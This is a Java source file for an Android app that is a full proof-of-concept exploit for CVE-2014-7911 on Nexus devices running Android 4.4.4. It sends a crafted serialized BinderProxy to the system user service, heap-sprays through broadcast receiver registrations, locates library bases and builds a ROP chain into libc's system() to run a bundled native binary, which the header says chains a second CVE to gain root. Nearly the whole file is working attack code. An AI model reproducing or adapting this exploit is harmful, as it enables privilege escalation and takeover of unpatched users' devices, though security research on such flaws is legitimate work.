/*
 *              CVE-2014-7911 exploit  for Nexus Android 4.4.4
 *
 *              author:  retme   retme7@gmail.com
 *              website: retme.net
 *
				 the poc will write  "file.txt"  into  /system ,and reboot
				 
				 CVE-2014-7911:  app  ->  system
				 CVE-2014-4322:  system -> root
 *
 *                                           */


package c.v.e;
import java.io.*;
import java.lang.reflect.*;
import java.security.SecureRandom;
import java.util.Calendar;
import java.util.Random;
import java.util.Timer;


import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.ApplicationInfo;
import android.content.res.AssetManager;
import android.location.LocationManager;
import android.os.*;
import android.util.Log;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.UnsupportedEncodingException;
import java.util.Scanner;

import c.v.e.R;




public class MainActivity extends Activity {
    private static final java.lang.String DESCRIPTOR = "android.os.IUserManager";
    private Class clStub;
    private Class clProxy;
    private int TRANSACTION_setApplicationRestrictions;
    private IBinder mRemote;
    
    public void setApplicationRestrictions(java.lang.String packageName, android.os.Bundle restrictions, int 
userHandle) throws android.os.RemoteException
    {
            android.os.Parcel _data = android.os.Parcel.obtain();
            android.os.Parcel _reply = android.os.Parcel.obtain();
            try {
                    _data.writeInterfaceToken(DESCRIPTOR);
                    _data.writeString(packageName);
                    _data.writeInt(1);
                    restrictions.writeToParcel(_data, 0);
                    _data.writeInt(userHandle);
                    
            byte[] data = _data.marshall();
            for (int i=0; true; i++) {
                    if (data[i] == 'A' && data[i+1] == 'A' && data[i+2] == 'd' && data[i+3] == 'r') {
                            data[i] = 'a';
                            data[i+1] = 'n';
                            break;
                    }
            }
            _data.recycle();
            _data = Parcel.obtain();
            _data.unmarshall(data, 0, data.length);
                    
                    mRemote.transact(TRANSACTION_setApplicationRestrictions, _data, _reply, 0);
                    _reply.readException();
            }
            finally {
                    _reply.recycle();
                    _data.recycle();
            }
    }
    
    
    void expolit(int static_address){
        Context ctx = getBaseContext();
        try {
                Bundle b = new Bundle();
                AAdroid.os.BinderProxy evilProxy = new AAdroid.os.BinderProxy();
                evilProxy.mOrgue = static_address ;
                b.putSerializable("eatthis", evilProxy);
                
                Class clIUserManager = Class.forName("android.os.IUserManager");
                Class[] umSubclasses = clIUserManager.getDeclaredClasses();
                System.out.println(umSubclasses.length+" inner classes found");
                Class clStub = null;
                for (Class c: umSubclasses) {
                        System.out.println("inner class: "+c.getCanonicalName());
                        if (c.getCanonicalName().equals("android.os.IUserManager.Stub")) {
                                clStub = c;
                        }
                }
                
                Field fTRANSACTION_setApplicationRestrictions =
                                clStub.getDeclaredField("TRANSACTION_setApplicationRestrictions");
                fTRANSACTION_setApplicationRestrictions.setAccessible(true);
                TRANSACTION_setApplicationRestrictions =
                                fTRANSACTION_setApplicationRestrictions.getInt(null);
                
                UserManager um = (UserManager) ctx.getSystemService(Context.USER_SERVICE);
                Field fService = UserManager.class.getDeclaredField("mService");
                fService.setAccessible(true);
                Object proxy = fService.get(um);
                
                Class[] stSubclasses = clStub.getDeclaredClasses();
                System.out.println(stSubclasses.length+" inner classes found");
                clProxy = null;
                for (Class c: stSubclasses) {
                        System.out.println("inner class: "+c.getCanonicalName());
                        if (c.getCanonicalName().equals("android.os.IUserManager.Stub.Proxy")) {
                                clProxy = c;
                        }
                }
                
                Field fRemote = clProxy.getDeclaredField("mRemote");
                fRemote.setAccessible(true);
                mRemote = (IBinder) fRemote.get(proxy);

                UserHandle me = android.os.Process.myUserHandle();
                setApplicationRestrictions(ctx.getPackageName(), b, me.hashCode());
                
                Log.i("badserial", "waiting for boom here and over in the system service...");
        } catch (Exception e) {
                throw new RuntimeException(e);
        }
    }
    
    
    void heap_spary(String str){   	
    	str = str + generateString(16);
    	try{
    		LocationManager lm = (LocationManager)getSystemService(LOCATION_SERVICE);
    		lm.addTestProvider(str.toString(), false, false, false, false, false, false, false, 1, 1);
    	} catch(Exception e) {
            //throw new RuntimeException(e);
    		//Log.d("7911", "exception" );
    		e.printStackTrace();
    }
    		
    		
    }
    
	BroadcastReceiver receiver = new BroadcastReceiver() {
		
		@Override
		public void onReceive(Context arg0, Intent arg1) {
			// TODO Auto-generated method stub
			
		}
	};
    void heap_spary_ex(String str){   	
    	str = str + generateString(16);
    	try{
    		IntentFilter inFilter = new IntentFilter();

    		inFilter.addAction(generateString(16));
    		
    		this.registerReceiver(receiver, inFilter,str,null);
    		//LocationManager lm = (LocationManager)getSystemService(LOCATION_SERVICE);
    		//lm.addTestProvider(str.toString(), false, false, false, false, false, false, false, 1, 1);
    	} catch(Exception e) {
            //throw new RuntimeException(e);
    		//Log.d("7911", "exception" );
    		e.printStackTrace();
    }
    		
    		
    }
    
    
    public static final String allChar = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    public static final String letterChar = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    public static final String numberChar = "0123456789";

    public static String generateString(int length) //参数为返回随机数的长度
    {
     StringBuffer sb = new StringBuffer();
     SecureRandom random = new SecureRandom();
     
     for (int i = 0; i < length; i++)
     {
      sb.append(allChar.charAt(random.nextInt(allChar.length())));
     }
    return sb.toString();
    }
    
    
    int get_base(String libname){
    	
        Scanner scanner = null;
        try {
            scanner = new Scanner(new File("/proc/self/maps"));
            while (scanner.hasNextLine()) {
                String line = scanner.nextLine().trim();
                String[] fields = line.split("\\s+");

                // Sample line:
                // 0001d000-00024000 rw-p 00000000 00:00 0          [heap]
                if (fields != null && fields.length >= 1) {
                    String addr = fields[0];
                    if (fields.length >= 6) {
                        String tag = fields[5];
                        if (libname.equals(tag)) {
                        	 String[] addrs = addr.split("-");
                        	 Log.d("cve", addrs[0]);
                        	 int i=Integer.parseInt(addrs[0],16);
                        	 return i;
                        	 //Log.d("cve", ""+ i);
                        } 
                    }
                }
            }
        } catch (FileNotFoundException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} finally {
            if (scanner != null) {
                scanner.close();
            }
        }
        return 0;
    }
    
    
	void ReleaseBin() {
		// TestJniMethods methods = new TestJniMethods();
		// android.os.Debug.waitForDebugger();

		AssetManager aManager = getAssets();
		ApplicationInfo appInfo = this.getApplicationInfo();
		

		try {
			InputStream in = aManager.open("msmattack");
			boolean bSuscess = true;
			String path = getFilesDir().getPath();
			path = path.substring(0, path.lastIndexOf("/", path.length() - 1));



			File file = new File(path, "e");
			// delete old file
			

			if (!file.exists())
				bSuscess = file.createNewFile();
				file.setExecutable(true, false);
			FileOutputStream out = new FileOutputStream(file);
			int c;
			byte buffer[] = new byte[1024];
			while ((c = in.read(buffer)) != -1) {
				for (int i = 0; i < c; i++)
					out.write(buffer[i]);
			}
			in.close();
			out.close();

			
			// RootUtils.RootCommand("" + file.getAbsolutePath());
		} catch (Exception e) {
			// TODO: handle exception

			
			e.printStackTrace();
		}
	}
/*
 * rop chain 1    ;[arm][libandroid_runtime]  0x00049770 : ldr r7, [r5] ; mov r2, r4 ; mov r0, r5 ; ldr r1, [sp, #0x10] ; ldr r4, [r7, #0x378] ; blx r4									  
	rop chain 2    ;[thumb][libc]             <- gaget buffer start + 0x378    0x00024348 : add.w r7, r7, #8 ; mov sp, r7 ; pop.w {r4, r5, r6, r7, lr} ; add sp, #0xc ; bx lr
 * rop chain 3   ; [arm][libc] 0x0003cc18 : push {r3, lr} ; bl #-0x3f4 ; ldr r0, [r0, #0x48] ; pop {r3, pc}
 * rop chain 4  ;[thumb][libc]   0x000250e1   200 FUNC    GLOBAL DEFAULT    8 system
 * */
    
    static int  rop_chain_debug[] = {0x00049770,0x00024348+4+1,0x0003cc18+8,0x000250e1};
    static int  rop_chain_KTU84P[] = {0x00049c40,0x00024348+4+1,0x0003cc0c+8,0x000250e1};
    
    static int  Unicode_buffer_lenth = 100000;
    static int  Gadget_buffer_lenth = 0x400;
    
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);
		
		Button b  = (Button) findViewById(R.id.button1);
		b.setOnClickListener(new OnClickListener() {
		
		
			@Override
			public void onClick(View arg0) {
				// TODO Auto-generated method stub

				//release native exploit
				ReleaseBin();
				
			       int dalvik_addr = get_base("/dev/ashmem/dalvik-heap");
			       int libc_addr = get_base("/system/lib/libc.so");
			       int libandroid_addr = get_base("/system/lib/libandroid_runtime.so");
			       
			       
			       int static_address = dalvik_addr+ 0x01001000;
			       Log.d("cve","exploiting.... static address 0x"+ Integer.toHexString(static_address));

                   int gadget_buffer_offset = Unicode_buffer_lenth - Gadget_buffer_lenth;
                   int gadget_buffer = static_address + gadget_buffer_offset;

                   Log.d("cve","exploiting.... gadget buffer 0x"+ Integer.toHexString(gadget_buffer));
                   Log.d("cve","exploiting.... gadget buffer offset 0x"+ Integer.toHexString(gadget_buffer_offset));
                   
                   char[] bytes = new char[Unicode_buffer_lenth/2];
                   bytes[0] = 0xbeaf;
                   bytes[1] = 0xdead;
                   int value = 0;
                   for(int k = 0;k<gadget_buffer_offset/2;k+=2){
                	   
                	   value = gadget_buffer-(2*k);
                	   bytes[k] = (char)value;
                	   bytes[k+1] = (char)((value >>16) & 0xffff);
                	   //Log.d("cve","0x" + Integer.toHexString((int)bytes[k+1])  + Integer.toHexString((int)bytes[k]));
                   }
                   
                   for(int k = gadget_buffer_offset/2;k<Unicode_buffer_lenth/2;k+=2){
                	   
                	   value = k/2;
                	   bytes[k] = (char)value;
                	   bytes[k+1] = (char)((value >>16) & 0xffff);
                
                   }
                   
                   int rop_chain[] = rop_chain_KTU84P;
                   /*		SHELL COMMAND BUFFER						<-	gaget buffer start -0x48
                    * 		.
                    * 		.
                    * 		.
                    * 		.
                    * 		1
                    * 		0xdeadbeef    														<- gaget buffer start
                    * 		static_address
                    * 		0xdeadbeef
                    * 		rop chain 1    ;[arm][libandroid_runtime]  0x00049770 : ldr r7, [r5] ; mov r2, r4 ; mov r0, r5 ; ldr r1, [sp, #0x10] ; ldr r4, [r7, #0x378] ; blx r4									  
                    * 		rop chain 3   ; [arm][libc] 0x0003cc18 : push {r3, lr} ; bl #-0x3f4 ; ldr r0, [r0, #0x48] ; pop {r3, pc}		
                    * 		.
                    * 		.
                    * 		.
                    * 		0xdeadbeef  <-	r3											<- gaget buffer start + 32n
                    * 		rop chain 4  ;[thumb][libc]   0x000250e1   200 FUNC    GLOBAL DEFAULT    8 system
                    *      . 
                    *      .
                    *      .
                    * 		.
                    * 		.
                    * 		.
                    * 		.
                    * 		rop chain 2    ;[thumb][libc]             <- gaget buffer start + 0x378    0x00024348 : add.w r7, r7, #8 ; mov sp, r7 ; pop.w {r4, r5, r6, r7, lr} ; add sp, #0xc ; bx lr

                    * */
                   
                   
                   //value  *(mOrgue+4) = 1
                   int m  =  gadget_buffer_offset/2-2;
                   value = 1;
            	   bytes[m] = (char)value;
            	   bytes[m+1] = (char)((value >>16) & 0xffff);
                   
            	   m+=2;
            	   value = 0xdeadbeef;
            	   bytes[m] = (char)value;
            	   bytes[m+1] = (char)((value >>16) & 0xffff);
            	   
            	   m+=2;
            	   value = static_address;
            	   bytes[m] = (char)value;
            	   bytes[m+1] = (char)((value >>16) & 0xffff);
            	   
            	   m+=2;
            	   value = 0xdeadbeef;
            	   bytes[m] = (char)value;
            	   bytes[m+1] = (char)((value >>16) & 0xffff);
            	   
            	   
            	   //controled ptr, do stack pivot
            	   //rop chain 1    ;[arm][libandroid_runtime]  0x00049770 : ldr r7, [r5] ; mov r2, r4 ; mov r0, r5 ; ldr r1, [sp, #0x10] ; ldr r4, [r7, #0x378] ; blx r4
            	   //android_runtime
            	   
            	   m+=2;
            	   value = libandroid_addr + rop_chain[0];
            	   bytes[m] = (char)value;
            	   bytes[m+1] = (char)((value >>16) & 0xffff);
            	   
            	   
            	   //rop chain 3   ; [arm][libc] 0x0003cc18 : push {r3, lr} ; bl #-0x3f4 ; ldr r0, [r0, #0x48] ; pop {r3, pc}
            	   m+=2;
            	   value = libc_addr + rop_chain[2];
            	   bytes[m] = (char)value;
            	   bytes[m+1] = (char)((value >>16) & 0xffff);
            	  
            	   
            	   //0xdeadbeef  <-	r3														<- gaget buffer start + 32n
            	   m =  (gadget_buffer_offset+ 32)/2;
            	   value = 0xdeadbeef;
            	   bytes[m] = (char)value;
            	   bytes[m+1] = (char)((value >>16) & 0xffff);
            	   
            	   //rop chain 4  ;[thumb][libc]   0x000250e1   200 FUNC    GLOBAL DEFAULT    8 system
            	   m += 2;
            	   value = libc_addr + rop_chain[3];
            	   bytes[m] = (char)value;
            	   bytes[m+1] = (char)((value >>16) & 0xffff);
            	   
            	   //C type char array,as system command			<- gaget buffer start + 0x48
/*
 * 
 * 0x7461642f
0x61642f61
0x632f6174
0x652e762e
0x0000652f*/
            	   m  =  (gadget_buffer_offset -  0x48)/2;
            	   value = 0x7461642f;
            	   bytes[m] = (char)value;
            	   bytes[m+1] = (char)((value >>16) & 0xffff);
            	   
            	   m+=2;
            	   value = 0x61642f61;
            	   bytes[m] = (char)value;
            	   bytes[m+1] = (char)((value >>16) & 0xffff);
            	   
            	   m+=2;
            	   value = 0x632f6174;
            	   bytes[m] = (char)value;
            	   bytes[m+1] = (char)((value >>16) & 0xffff);
            	   
            	   m+=2;
            	   value = 0x652e762e;
            	   bytes[m] = (char)value;
            	   bytes[m+1] = (char)((value >>16) & 0xffff);
            	   
            	   m+=2;
            	   value = 0x0000652f;
            	   bytes[m] = (char)value;
            	   bytes[m+1] = (char)((value >>16) & 0xffff);
            	   
            	   //at rop chain 1.ins is  "ldr r4, [r7, #0x378] ; blx r4"
            	   //now static_addr + 0x378 should set as next rop chain addr

            	   //rop chain 2    ;[thumb][libc]             <- gaget buffer start + 0x378    
            	   //0x00024348 : add.w r7, r7, #8 ; mov sp, r7 ; pop.w {r4, r5, r6, r7, lr} ; add sp, #0xc ; bx lr
            	   m  =  (gadget_buffer_offset+ 0x378)/2;
            	   value = libc_addr + rop_chain[1];
            	   bytes[m] = (char)value;
            	   bytes[m+1] = (char)((value >>16) & 0xffff);
            	   
            	   /*mov sp, r7 ; sp = r7 = gadget_buffer
            	    * pop.w {r4, r5, r6, r7, lr}  ; sp = gadget_buffer + n20
            	    * add sp, #0xc ; sp = gadget_buffer +n32
            	    *  bx lr  <- next chain
            	    * 
            	    * */

                   //for(int k = 0;k<Unicode_buffer_lenth/2;k+=2){
                
                	//   Log.d("cve","0x" + Integer.toHexString((int)bytes[k+1])  + Integer.toHexString((int)bytes[k]));
                   //}

                   String str = null;
					str = String.valueOf(bytes);
					//Log.d("cve","str is " + str);
			       for (int i=0;i<2000;i++){
			    	  heap_spary_ex(str);
			    	  
			    	  if(i%100 == 0)
			    		  Log.d("cve","sparying.... "+ i);
			       }


			       expolit(static_address);
			}
		});


	}

	
}
